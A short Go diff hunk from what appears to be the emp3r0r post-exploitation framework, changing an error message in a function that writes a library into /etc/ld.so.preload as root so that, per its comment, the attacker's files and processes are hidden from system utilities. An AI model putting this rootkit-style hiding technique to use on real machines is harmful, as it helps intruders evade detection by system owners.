@@ -144,7 +144,7 @@ func profiles() (err error) {
 // our files and processes will be hidden from common system utilities
 func ldPreload() error {
 	if !IsFileExist(Libemp3r0rFile) {
-		return fmt.Errorf("%s does not exist!", Libemp3r0rFile)
+		return fmt.Errorf("%s does not exist! Try module vaccine?", Libemp3r0rFile)
 	}
 	if os.Geteuid() == 0 {
 		return ioutil.WriteFile("/etc/ld.so.preload", []byte(Libemp3r0rFile), 0600)
